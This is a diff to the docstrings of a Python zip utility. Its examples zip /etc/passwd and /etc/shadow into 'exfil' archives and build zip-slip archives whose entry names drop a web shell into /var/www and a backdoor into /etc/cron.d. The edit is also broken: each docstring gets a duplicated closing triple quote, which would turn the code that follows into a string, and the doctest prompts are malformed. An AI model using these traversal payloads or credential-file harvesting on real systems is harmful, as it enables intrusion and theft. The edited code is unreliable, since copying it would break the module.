@@ -30,11 +30,12 @@ def zip_file(file_path, output_path=None, name_in_zip=None):
         Path to the created zip file
 
     Examples:
-        zip_file('/etc/passwd', 'stolen_passwd.zip')
-        zip_file('../secret.txt')  # Creates secret.zip in current dir
+        ... zip_file('/etc/passwd', 'stolen_passwd.zip')
+        >>> zip_file('../secret.txt')  # Creates secret.zip in current dir
 
-        # Zip slip - file extracts to ../../../evil.sh
-        zip_file('payload.sh', 'malicious.zip', name_in_zip='../../../evil.sh')
+        >>> # Zip slip - file extracts to ../../../evil.sh
+        >>> zip_file('payload.sh', 'malicious.zip', name_in_zip='../../../evil.sh')
+    """
     """
     file_path = Path(file_path)
 
@@ -83,8 +84,9 @@ def zip_folder(folder_path, output_path=None):
         Path to the created zip file
 
     Examples:
-        zip_folder('/home/user/documents', 'exfil_docs.zip')
-        zip_folder('../sensitive_data/')  # Creates sensitive_data.zip
+        ... zip_folder('/home/user/documents', 'exfil_docs.zip')
+        >>> zip_folder('../sensitive_data/')  # Creates sensitive_data.zip
+    """
     """
     folder_path = Path(folder_path)
 
@@ -135,8 +137,9 @@ def quick_zip(path, output=None):
         Path to created zip file or None
 
     Examples:
-        quick_zip('/etc/passwd')
-        quick_zip('../important_stuff/')
+        ... quick_zip('/etc/passwd')
+        >>> quick_zip('../important_stuff/')
+    """
     """
     path = Path(path)
 
@@ -165,15 +168,16 @@ def zip_multiple(paths, output_path="archive.zip", names_in_zip=None):
         Path to created zip file or None
 
     Examples:
-        # Normal usage
-        zip_multiple(['/etc/passwd', '/etc/shadow'], 'exfil.zip')
+        >>> # Normal usage
+        >>> zip_multiple(['/etc/passwd', '/etc/shadow'], 'exfil.zip')
 
-        # With custom names (zip slip)
-        zip_multiple(
-            ['payload1.txt', 'payload2.txt'],
-            'malicious.zip',
-            names_in_zip=['../../../var/www/shell.php', '../../../../etc/cron.d/backdoor']
-        )
+        >>> # With custom names (zip slip)
+        >>> zip_multiple(
+        ...     ['payload1.txt', 'payload2.txt'],
+        ...     'malicious.zip',
+        ...     names_in_zip=['../../../var/www/shell.php', '../../../../etc/cron.d/backdoor']
+        >>> )
+    """
     """
     output_path = Path(output_path)
 
@@ -231,8 +235,9 @@ def extract_zip(zip_path, extract_to=None):
         Path to extraction directory or None
 
     Examples:
-        extract_zip('data.zip')
-        extract_zip('archive.zip', '/tmp/extracted/')
+        ... extract_zip('data.zip')
+        >>> extract_zip('archive.zip', '/tmp/extracted/')
+    """
     """
     zip_path = Path(zip_path)
 
